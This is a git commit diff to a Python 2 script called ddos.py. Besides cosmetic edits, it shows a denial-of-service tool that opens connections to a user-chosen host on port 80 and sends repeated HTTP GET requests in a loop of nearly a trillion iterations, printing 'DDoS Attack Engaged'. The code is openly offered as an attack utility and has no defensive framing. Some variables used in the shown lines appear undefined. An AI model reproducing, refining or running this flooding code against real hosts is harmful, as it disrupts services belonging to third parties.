a9119ac484892cf21fd68ca2f0789b623b2c0672
Henrique Bissoli <emp.shad@gmail.com>
2016-01-11 14:47:38 -0200

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,5 +1,9 @@
-# -*- coding: utf-8 -*-
-import time, socket, os, sys, string
+#!/usr/bin/python
+#  -*- coding: utf-8 -*-
+# DDoS-Python (IMPS)
+# @autor: Henrique Bissoli Silva (emp.shad@gmail.com)
+# Updates: https://github.com/Shadowz3n/DDoS-Python
+import socket, sys
 
 if len(sys.argv)>1:
 	host=sys.argv[1]
@@ -10,15 +14,15 @@ if len(sys.argv)>1:
 	    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	    try:
 	        ddos.connect((host, 80))
-	        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
-	        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
-	        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+	        ddos.send( "GET /%s HTTP/1.1\r\n" % message)
+	        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port))
+	        ddos.send( "GET /%s HTTP/1.1\r\n" % message)
 	    except socket.error, msg:
 	        print("|[Connection Failed]         |")
-	    print ( "|[DDoS Attack Engaged]       |")
+	    print ("|[DDoS Attack Engaged]       |")
 	    ddos.close()
 	
 	for i in xrange(999999999999):
 	    dos()
 else:
-	print("Usage:\tpython ddos.py domain port")
+	print("Usage:\tpython "+sys.argv[0]+" <domain> <port>")
